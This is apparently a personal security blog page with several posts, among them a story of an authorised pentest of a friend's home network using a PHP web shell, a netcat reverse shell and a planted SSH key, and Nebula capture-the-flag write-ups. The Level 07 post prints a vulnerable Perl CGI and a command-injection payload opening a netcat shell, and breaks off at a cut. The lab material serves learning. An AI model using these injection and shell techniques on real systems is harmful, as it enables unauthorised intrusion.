+<li>To enable debugging: In your project select File&gt;New File Property List and create a file called &#8220;Entitlements.plist&#8221;. Add “Can be debugged” or “get-task-allow” (both do the same thing) and set the value to YES.</li>
+<li>Now change your Project and Target Code Signing Entitlements (In Build Settings) to &#8220;Entitlements.plist&#8221; (you have to type it in).</li>
+</ol>
+<p>Now XCode can run and debug the app. Good luck</p>
+<p>Note that some poeple have issues because they have other appsyncs installed. Remove all other appsyncs and install AppSync Unified from http://cydia.angelxwind.net/ (you&#8217;ll have to add this repo to cydia)</p>
+<p>Thanks to Karen and Linus for developing AppSync Unified.</p>
+<p><a href="https://www.reddit.com/r/jailbreak/comments/2m45y8/release_appsync_unified_51_with_full_ios_8/">This subreddit may be helpful</a></p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/ios/jailbreak/appsync/" rel="category tag">AppSync</a>, <a href="/category/development/" rel="category tag">Development</a>, <a href="/category/ios/" rel="category tag">iOS</a>, <a href="/category/ios/jailbreak/" rel="category tag">JailBreak</a>, <a href="/category/development/xcode/" rel="category tag">XCode</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/developing-and-debugging-my-own-apps-on-jailbroken-ios8-1-using-xcode-6-1-without-paying-apple/#comments"><b>64</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-260 -->
+
+				
+					
+	<article id="post-238" class="post-238 post type-post status-publish format-standard hentry category-uncategorized">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/i-have-a-raspberry-pi-on-the-way/" rel="bookmark">I have a Raspberry PI on the way</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/i-have-a-raspberry-pi-on-the-way/" title="4:39 PM" rel="bookmark"><time class="entry-date" datetime="2013-01-06T16:39:02+00:00">2013-01-06</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/i-have-a-raspberry-pi-on-the-way/#comments">1</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I ordered a Raspberry PI yesterday.</p>
+<p>I used to have a server running at home which served files, recorded tv, provided VPN, but I moved into a small flat, and there&#8217;s not much room for a server, not that my fiancée would be happy with anyway!</p>
+<p>The PI will give me a little server back again for the duration that I&#8217;m in this flat. I&#8217;m also looking at playing with xbmc and perhaps some pvr capabilities on it. Should be fun!</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/i-have-a-raspberry-pi-on-the-way/#comments"><b>1</b> Reply</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-238 -->
+
+				
+					
+	<article id="post-227" class="post-227 post type-post status-publish format-standard hentry category-exploit category-infosec category-lesson-learned category-os-x category-pentest category-php category-shell category-unix category-web-server category-webapp">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/my-first-pentest-on-a-friends-network/" rel="bookmark">My first pentest on a friend&#8217;s network</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/my-first-pentest-on-a-friends-network/" title="4:31 PM" rel="bookmark"><time class="entry-date" datetime="2013-01-06T16:31:58+00:00">2013-01-06</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/my-first-pentest-on-a-friends-network/#comments">9</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>Someone I have know for a while was aware of my growing interest in information security and I had warned them a while ago that their network was probably vulnerable to attack because I had seen some web services that were not password protected running out of their home public IP address.</p>
+<p>I saw them over the Christmas/new year period and they gave me permission to try and penetrate their network, specifically they challenged me to change the root password on their unRAID server.</p>
+<p>I started off by firing up my Backtrack 5r3 VM and updating everything before registering Nessus and performing a scan of his public IP address.</p>
+<p>Nessus didn&#8217;t find anything that was listed as critical, but it did show me that we had ssh running on port 22 and it also showed me all other ports that were open and had web servers running on them. I checked them all out and I found on various ports; the default Lion server webpage, SABNZBd, SickBeard, Transmission, and the unRAID server.</p>
+<p>The website served by the unRAID server was asking for a username and password using basic access authentication. That was no use so I started looking into the other services. Not only were the operating interfaces unsecured, but their configuration sections were also open to anyone. I saw that SABNZBd was running as &#8220;admin&#8221; and that it had an option of running scripts when a download had completed. The method was to point SABNZBd to a folder containing scripts, start a download and then choose what script to run on completion. I knew I could download a file using SABNZBd or Transmission to any directory that the admin user had write permissions to, but I didn&#8217;t know at this stage how to make it executable.</p>
+<p>I saw in SABNZBd&#8217;s preferences that I could specify the permissions (in octal format) of files and folders that were downloaded, so I ran SABNZBd on my machine, created a binary post on a newsgroup containing a script that was basically a reverse shell and tested a download to my machine with SABNZBd set to mark everything at 777. It created a folder with 777 permissions, but the file was only 555. Presumably this was for security reasons &#8211; damn!</p>
+<p>At this point I was wishing that his machine was running Windows not OSX because SABNZBd on Windows only requires that a scripts file extension is in the PATHEXT environment variable. That would have been much easier than getting a file marked as executable.</p>
+<p>I had to find another way of making an executable script on that machine. How could I get that machine to run my commands without having an executable script set&#8230; The web server or course. I created my single line PHP shell again (mentioned in a previous post) and set Transmission to download files to the Lion web server default folder, created a torrent containing my php script and downloaded the torrent to the server using transmission. I tested it, with the command <strong>whoami</strong>, and it worked. I was in, but I was only the user _www.</p>
+<p>What could I do as _www? Not much, but I was able to create a reverse shell using netcat and take a look around the system. I couldn&#8217;t access admin&#8217;s files yet, but of course I could write to /tmp. If I could write to /tmp, I could create a script and mark it as executable by everyone. Then I could get SABNZBd to run it! I started thinking about making a script that would create a reverse shell, then it dawned on me: create a public/private key pair and add it to /Users/admin/.ssh/authorized_keys.</p>
+<p>I uploaded my public key using my php shell script, and then created an executable script in /tmp that appended my key to authorized_keys.</p>
+<p>I started a new SABNZBd download (I decided to just download something that was small, free and released under the CC license) so as no to upset anyone. Obviously I now set my script to run. All went well and I could now ssh into the machine as the admin user without a password.</p>
+<p>At this point I cleaned up everything I had downloaded and just left my key in place so I could log in. I took a look around, but I couldn&#8217;t see anything to do with the unRAID server, so I thought I should report how far I had got.</p>
+<p>They were surprised, and while I didn&#8217;t get into the unRAID server, I had gotten a lot further than they thought anyone would be able to. As a result of this, they have since enabled logins on all their web services and removed my public key, but they still do have some vulnerabilities, like ssh running on a default port and allowing password authentication (ripe for brute forcing). They are a lot safer than they were, but it may well be worth me going back and having another go at some point in the future.</p>
+<p>A lot of the methods that I have used in this test were inspired by the challenges I have been working through in hackthissite.org and exploit-excercises.com and I&#8217;m very grateful to them for making the challenges.</p>
+<p>I&#8217;m tempted to try and create a VM with this vulnerable setup and release it. I would have to check the licences, but I think most of it could be done using open source solutions (linux, apache, sabnzbd, transmission)</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/exploit/" rel="category tag">Exploit</a>, <a href="/category/infosec/" rel="category tag">Information Security</a>, <a href="/category/lesson-learned/" rel="category tag">Lesson Learned</a>, <a href="/category/os-x/" rel="category tag">OS X</a>, <a href="/category/infosec/pentest/" rel="category tag">Penetration Test</a>, <a href="/category/php/" rel="category tag">PHP</a>, <a href="/category/shell/" rel="category tag">Shell</a>, <a href="/category/unix/" rel="category tag">Unix</a>, <a href="/category/web-server/" rel="category tag">Web Server</a>, <a href="/category/infosec/webapp/" rel="category tag">WebApp</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/my-first-pentest-on-a-friends-network/#comments"><b>9</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-227 -->
+
+				
+					
+	<article id="post-228" class="post-228 post type-post status-publish format-standard hentry category-email category-hash category-password-complexity category-passwords category-plaintext">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/match-com-just-sent-me-an-email-containing-my-password-in-plain-text/" rel="bookmark">Match.com just sent me an email containing my password in plain text!</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/match-com-just-sent-me-an-email-containing-my-password-in-plain-text/" title="10:47 AM" rel="bookmark"><time class="entry-date" datetime="2012-12-31T10:47:26+00:00">2012-12-31</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/match-com-just-sent-me-an-email-containing-my-password-in-plain-text/#comments">8</a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>A few weeks ago, when I was going through all my online accounts and making the passwords more secure and unique I logged in to <a href="http://www.match.com/">Match.com</a> and deactivated my account. I didn&#8217;t delete it, just made it dormant. I did this because I found my Fiancée over 3 years ago (via Match.com) so there was no reason to still have an active account. I didn&#8217;t want to delete the account because it had some of our earliest messages to each other saved.</p>
+<p>Anyway, I checked my emails today and noticed that I had one from them encouraging me to re-activate my account. What was more concerning was that the email contained my password in plain text! Here is a screenshot of the email:</p>
+<p><a href="/match-com-just-sent-me-an-email-containing-my-password-in-plain-text/screen-shot-2012-12-31-at-10-13-27/" rel="attachment wp-att-229"><img decoding="async" class="alignnone size-thumbnail wp-image-229" alt="Screen Shot 2012-12-31 at 10.13.27" src="/wp-content/uploads/2012/12/Screen-Shot-2012-12-31-at-10.13.27-150x150.png" width="150" height="150" srcset="/wp-content/uploads/2012/12/Screen-Shot-2012-12-31-at-10.13.27-150x150.png 150w, /wp-content/uploads/2012/12/Screen-Shot-2012-12-31-at-10.13.27-300x300.png 300w, /wp-content/uploads/2012/12/Screen-Shot-2012-12-31-at-10.13.27.png 584w" sizes="(max-width: 150px) 100vw, 150px"></a></p>
+<p>I was about to submit them to <a href="http://plaintextoffenders.com/">plaintextoffenders.com </a>but I did a search before and found that they were already added to the list 15 months ago, so I left a comment on the plaintextoffenders listing and decided to send a message to Match.com. The message was:</p>
+<p style="padding-left: 30px;"><em>On the 20th of December 2012 I received an email encouraging me to reactivate my account. What concerns me is that in the body of the email was my password, in plain text! Firstly you should not be storing my password in plain text, and secondly (if you insist on storing passwords as plain text) you should not be sending it to me over something as insecure as email, especially if I didn&#8217;t request it!</em></p>
+<p style="padding-left: 30px;"><em>I was about to submit match.com to http://plaintextoffenders.com, but when I searched, I saw that it was already submitted some 15 months ago. See <a href="http://plaintextoffenders.com/post/9744438766/match-com-dating-site-very-soon-after-i-got-this">http://plaintextoffenders.com/post/9744438766/match-com-dating-site-very-soon-after-i-got-this</a>.</em></p>
+<p style="padding-left: 30px;"><em>For a brief overview of why storing passwords in plain text is bad, you can start reading here: <a href="http://plaintextoffenders.com/about/">http://plaintextoffenders.com/about/</a></em></p>
+<p style="padding-left: 30px;"><em>Please bear in mind that while you are now being shamed by plaintextoffenders.com, if you decide to fix the security flaw, your site would be moved to a different section of the site where you would be praised for admitting the fault and fixing it. See <a href="http://plaintextoffenders.com/reformed">http://plaintextoffenders.com/reformed</a></em></p>
+<p style="padding-left: 30px;"><em>I am in no way affiliated with plaintextoffenders.com, but I do support what they are trying to do and I would like to know if you are in the process of fixing, or plan to fix this security flaw in the near future?</em></p>
+<p style="padding-left: 30px;"><em>Please reply to &lt;email address removed&gt;</em></p>
+<p>I will update this post if/when I get a reply, but in the meantime I would recommend against joining Match.com and deleting any accounts you might have with them until they act a bit more responsibly.</p>
+<p><strong>Update: </strong>I got this email back from Match.com:</p>
+<p style="padding-left: 30px;">Thank you for contacting us at <a href="http://match.com/">match.com</a>.</p>
+<p style="padding-left: 30px;"><em>We understand that you received an email from us on the 20th December 2012 with your password in plain text which you feel is a serious compromise of security.</em></p>
+<p style="padding-left: 30px;"><em>We are really sorry about this error and I have forwarded your issue to our site developers to look into.</em></p>
+<p style="padding-left: 30px;"><em>We hope you have found this information useful and please feel free to get in touch if there is anything further we can help you with. For answers to the most common questions click &#8216;Help&#8217;, available from the foot of any page.</em></p>
+<p>At least they are not dismissing it. I wonder if anything will actually change?</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/email/" rel="category tag">Email</a>, <a href="/category/infosec/hash/" rel="category tag">Hash</a>, <a href="/category/passwords/password-complexity/" rel="category tag">Password Complexity</a>, <a href="/category/passwords/" rel="category tag">Passwords</a>, <a href="/category/passwords/plaintext/" rel="category tag">Plaintext</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/match-com-just-sent-me-an-email-containing-my-password-in-plain-text/#comments"><b>8</b> Replies</a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-228 -->
+
+				
+					
+	<article id="post-225" class="post-225 post type-post status-publish format-standard hentry category-education category-online-course category-stanford-online">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/i-passed-my-course/" rel="bookmark">I passed my course :-)</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/i-passed-my-course/" title="9:32 PM" rel="bookmark"><time class="entry-date" datetime="2012-12-11T21:32:30+00:00">2012-12-11</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/i-passed-my-course/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I was doing a free online networking course from Stanford University called &#8220;An Introduction to Computer Networks&#8221; recently, and they just told me that I passed.</p>
+<p>Apparently I needed 50%, and I got 84%. I needn&#8217;t have tried so hard!</p>
+<p>I think the course title was misleading; I was expecting to learn a bit more detail about stuff that I had already taught myself about simple LANs; network masks, routing, etc. but it was much more than just this this. It was actually more to do with how the internet works and included some quite complicated concepts and mathematical/statistical theories. I found it pretty hard work, to the point that I considered jacking it in a couple of times, because it was taking a lot of my evening and weekend time, but I&#8217;m glad I made it through. I&#8217;m just thankful that it was quite short (about 6 weeks) because now the pressure is off and I have some free time again.</p>
+<p>The free course is by Stanford University professors Nick McKeown and Philip Levis and many subjects in detail including:</p>
+<ul>
+<li>Protocols:
+<ul>
+<li>IP</li>
+<li>TCP</li>
+<li>UDP</li>
+<li>ICMP</li>
+<li>ARP</li>
+<li>DHCP</li>
+<li>DNS</li>
+<li>NAT</li>
+<li>BGP</li>
+<li>Ethernet</li>
+</ul>
+</li>
+<li>Other Theory:
+<ul>
+<li>Encapsulation</li>
+<li>Packet Switching</li>
+<li>Delays (End to End &amp; Queueing)</li>
+<li>Broadcasting</li>
+<li>Routing</li>
+<li>Wireless</li>
+</ul>
+</li>
+</ul>
+<p>The course goes into so much detail in these subjects, and in many more. They are planning on re-running the course in Autumn 2013, so if any of this sounds interesting to you, then you should definitely consider enrolling nearer the time.</p>
+<p>So now I&#8217;m just waiting to receive my statement on completion&#8230; I think it&#8217;s due in the new year.</p>
+<p>Lastly I should say thanks to Nick and Philip for putting the course together and for offering it for free &#8211; Cheers guys</p>
+					</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/education/" rel="category tag">Education</a>, <a href="/category/education/online-course/" rel="category tag">Online Course</a>, <a href="/category/education/online-course/stanford-online/" rel="category tag">Stanford Online</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/i-passed-my-course/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-225 -->
+
+				
+					
+	<article id="post-222" class="post-222 post type-post status-publish format-standard hentry category-uncategorized">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-08/" rel="bookmark">Exploit Exercises – Nebula – Level 08</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-08/" title="12:17 PM" rel="bookmark"><time class="entry-date" datetime="2012-12-01T12:17:44+00:00">2012-12-01</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-08/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>I must admit I needed a bit of help with his one, I had most of it but not quite all. It started with the following information:</p>
+<p style="text-align: left; padding-left: 30px;">World readable files strike again. Check what that user was up to, and use it to log into flag08 account.<br>
+To do this level, log in as the level08 account with the password level08 . Files for this level can be found in /home/flag08.</p>
+<p style="text-align: left;">So in ~flag08 there is one file of interest; capture.pcap. This is some captured network traffic. I copied this file onto my Macbook and opened it up in wireshark and spent some time looking through it. I found some interesting information like frame 43 contained a password prompt (the text &#8220;Password:&#8221;) from the server, followed by an ack from the client, then all subsequent packet exchanges contained 1 byte of TCP payload data from the client followed by an empty TCP ack packet from the server. Going through the packets, I could see that the user had sent: &#8220;backdoor&#8230;00Rm8.ate.&#8221; and then the server had replied &#8220;Login incorrect&#8221;. If we right click on a packet in the stream and select Follow TCP stream, we can see this a bit clearer.</p>
+<p style="text-align: left;">But &#8220;backdoor&#8230;00Rm8.ate.&#8221; is not the password for flag08&#8217;s account, we need more investigation. While in the Follow TCP stream view, I selected hex dump view, and I can see that all the dots are not the same byte. Presumably they are all ascii, so I checked the ascii codes; 7f=backspace, 0d=Carriage-return.</p>
+<p style="text-align: left;">So the password was &#8220;backd00Rmate&#8221;, this just so happens to be the password for flag08&#8217;s account.</p>
+<p style="text-align: left;">
+					</p>
+</div>
+<!-- .entry-content -->
+		
+		<footer class="entry-meta">
+			
+										<span class="cat-links">
+					<span class="entry-utility-prep entry-utility-prep-cat-links">Posted in</span> <a href="/category/uncategorized/" rel="category tag">Uncategorized</a>			</span>
+							
+										
+										<span class="sep"> | </span>
+						<span class="comments-link"><a href="/exploit-exercises-nebula-level-08/#respond"><span class="leave-reply">Leave a reply</span></a></span>
+			
+					</footer><!-- .entry-meta -->
+	</article><!-- #post-222 -->
+
+				
+					
+	<article id="post-218" class="post-218 post type-post status-publish format-standard hentry category-uncategorized">
+		<header class="entry-header">
+						<h1 class="entry-title"><a href="/exploit-exercises-nebula-level-07/" rel="bookmark">Exploit Exercises – Nebula – Level 07</a></h1>
+			
+						<div class="entry-meta">
+				<span class="sep">Posted on </span><a href="/exploit-exercises-nebula-level-07/" title="11:58 AM" rel="bookmark"><time class="entry-date" datetime="2012-12-01T11:58:49+00:00">2012-12-01</time></a><span class="by-author"> <span class="sep"> by </span> <span class="author vcard"><a class="url fn n" href="/author/admin/" title="View all posts by Graeme Robinson" rel="author">Graeme Robinson</a></span></span>			</div>
+<!-- .entry-meta -->
+			
+						<div class="comments-link">
+				<a href="/exploit-exercises-nebula-level-07/#respond"><span class="leave-reply">Reply</span></a>			</div>
+					</header><!-- .entry-header -->
+
+				<div class="entry-content">
+			<p>This one starts with the following information:</p>
+<p style="padding-left: 30px;">The <em>flag07</em> user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>
+<p>and Source code:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr>
+<td class="line_numbers"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td>
+<td class="code"><pre class="perl" style="font-family:monospace;"><span style="color: #666666; font-style: italic;">#!/usr/bin/perl</span>
+&nbsp;
+<span style="color: #000000; font-weight: bold;">use</span> CGI <span style="color: #000066;">qw</span><span style="color: #009900;">&#123;</span>param<span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #000066;">print</span> <span style="color: #ff0000;">&quot;Content-type: text/html<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #000000; font-weight: bold;">sub</span> ping <span style="color: #009900;">&#123;</span>
+    <span style="color: #0000ff;">$host</span> <span style="color: #339933;">=</span> <span style="color: #0000ff;">$_</span><span style="color: #009900;">&#91;</span><span style="color: #cc66cc;">0</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #000066;">print</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #0000ff;">@output</span> <span style="color: #339933;">=</span> <span style="color: #ff0000;">`ping -c 3 $host 2&gt;&amp;1`</span><span style="color: #339933;">;</span>
+    <span style="color: #b1b100;">foreach</span> <span style="color: #0000ff;">$line</span> <span style="color: #009900;">&#40;</span><span style="color: #0000ff;">@output</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span> <span style="color: #000066;">print</span> <span style="color: #ff0000;">&quot;$line&quot;</span><span style="color: #339933;">;</span> <span style="color: #009900;">&#125;</span> 
+&nbsp;
+    <span style="color: #000066;">print</span><span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #666666; font-style: italic;"># check if Host set. if not, display normal page, etc</span>
+&nbsp;
+ping<span style="color: #009900;">&#40;</span>param<span style="color: #009900;">&#40;</span><span style="color: #ff0000;">&quot;Host&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td>
+</tr></table>
+<p class="theCode" style="display:none;">#!/usr/bin/perl
+
+use CGI qw{param};
+
+print &quot;Content-type: text/html\n\n&quot;;
+
+sub ping {
+    $host = $_[0];
+
+    print(&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;);
+
+    @output = `ping -c 3 $host 2&gt;&amp;1`;
+    foreach $line (@output) { print &quot;$line&quot;; } 
+
+    print(&quot;&lt;/pre&gt;&lt;/body&gt;&lt;/html&gt;&quot;);
+
+}
+
+# check if Host set. if not, display normal page, etc
+
+ping(param(&quot;Host&quot;));</p>
+</div>
+
+<p>We can see that the flag07 user has an thttpd.conf file in his directory, indicating that he has a http daemon or (web server) running. This is further compounded by the fact that he has a perl script (index.cgi) in his home directory.</p>
+<p>In the thttpd.conf file it tells us that the web server is running on port 7007. I didn&#8217;t want to exit the VM, which meant that I didn&#8217;t have a web browser, but I do have wget which allows me to make http requests from the command line so I ran:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O-</span> http:<span style="color: #000000; font-weight: bold;">//</span>localhost:<span style="color: #000000;">7007</span><span style="color: #000000; font-weight: bold;">/</span>index.cgi</pre></td></tr></table>
+<p class="theCode" style="display:none;">wget -O- http://localhost:7007/index.cgi</p>
+</div>
+
+<p>and got some output telling me how to use ping (because it hadn&#8217;t been given sufficient arguments. From the perl code, I could see that it wants a variable submitted as &#8220;Host&#8221;. It looks like it will use this as the machine name to ping. This time I tried:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">wget</span> <span style="color: #660033;">-O-</span> http:<span style="color: #000000; font-weight: bold;">//</span>localhost:<span style="color: #000000;">7007</span><span style="color: #000000; font-weight: bold;">/</span>index.cgi?<span style="color: #007800;">Host</span>=localhost</pre></td></tr></table>
+<p class="theCode" style="display:none;">wget -O- http://localhost:7007/index.cgi?Host=localhost</p>
+</div>
+
+<p>and got back ping results, but I need to get this script to do something other than ping&#8230; I can see that the ping command is just a string with the submitted host name &#8220;injected&#8221; into it. There is no input sanitisation going on, so it is ripe for some code injection.</p>
+<p>I could get the script to copy my elevated-shell-launcher program and thenset the setuid bit like I did in level 03, but this challenge reminded me of something I learned while playing with DVWA (using netcat to send shell over the network) so I tried that method instead. The url I need to load would submit the following as the Host variable:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;">;<span style="color: #c20cb9; font-weight: bold;">mkfifo</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe<span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">bash</span><span style="color: #000000; font-weight: bold;">|</span>nc <span style="color: #660033;">-l</span> <span style="color: #000000;">4444</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">&amp;</span>amp;<span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>fifo;</pre></td></tr></table>
+<p class="theCode" style="display:none;">;mkfifo /tmp/pipe;cat /tmp/pipe|bash|nc -l 4444 2&amp;gt;&amp;amp;1&amp;gt;/tmp/pipe;rm /tmp/fifo;</p>
+</div>
+
+<p>When injected to the command that is run in the perl script, to actual command that is executed will be:</p>
+
+<div class="wp_syntax" style="position:relative;">
+<table><tr><td class="code"><pre class="bash" style="font-family:monospace;"><span style="color: #c20cb9; font-weight: bold;">ping</span> <span style="color: #660033;">-c</span> <span style="color: #000000;">3</span> ;<span style="color: #c20cb9; font-weight: bold;">mkfifo</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe<span style="color: #000000; font-weight: bold;">|</span><span style="color: #c20cb9; font-weight: bold;">bash</span><span style="color: #000000; font-weight: bold;">|</span>nc <span style="color: #660033;">-l</span> <span style="color: #000000;">4444</span> <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">&amp;</span>amp;<span style="color: #000000;">1</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>pipe;<span style="color: #c20cb9; font-weight: bold;">rm</span> <span style="color: #000000; font-weight: bold;">/</span>tmp<span style="color: #000000; font-weight: bold;">/</span>fifo; <span style="color: #000000;">2</span><span style="color: #000000; font-weight: bold;">&amp;</span>gt;<span style="color: #000000; font-weight: bold;">&amp;</span>amp;<span style="color: #000000;">1</span></pre></td></tr></table>
+<p class="theCode" style="display:none;">ping -c 3 ;mkfifo /tmp/pipe;cat /tmp/pipe|bash|nc -l 4444 2&amp;gt;&amp;amp;1&amp;gt;/tmp/pipe;rm /tmp/fifo; 2&amp;gt;&amp;amp;1</p>
+</div>
+
+<p>This is quite a command, so I&#8217;ll break it down:</p>
+<ul>
+<li>
+<strong>ping -c 3 ;</strong> &#8211; This command will fail because there is no host given, but we don&#8217;t care about that</li>
+<li>
+<strong>mkfifo /tmp/pipe;</strong> &#8211; Make a special &#8220;pipe&#8221; file in /tmp/pipe, I&#8217;ll explain why later&#8230;</li>
+<li>
+<strong>cat /tmp/pipe|bash|nc -l 4444 2&gt;&amp;1&gt;/tmp/pipe;</strong> &#8211; this reads data from the /tmp/pipe and sends it to /bin/bash, which sends it&#8217;s output to nc, which is listening on port 4444, which then sends it&#8217;s output (stdout and stderr) back to /tmp/pipe.</li>
+<li>
+<strong>rm /tmp/fifo;</strong> &#8211; clear up the pipe file after nc has closed.</li>
+<li>
+<strong>2&gt;&amp;1</strong> &#8211; Redirects stderr to stdout. This is just left over from the perl script&#8217;s command, we don&#8217;t care about it really.</li>
+</ul>
+<p>This should set up a netcat process listening on TCP port 4444 that will accept data (in our case this will be bash commands) from the network and send it to /tmp/pipe. cat will read data from /tmp/pipe and send it to bash, which will send it&#8217;s output to netcat, which will in turn send that back over the network. A kind of remote shell. Passing input/output of netcat and bash in this circular fashion is only possible by way of a fifo pipe and the cat command.</p>
+<p>Obviously I&#8217;ll have to URL encode my host variable, so my whole command becomes:</p>
+
+<div class="wp_syntax" style="position:relative;">
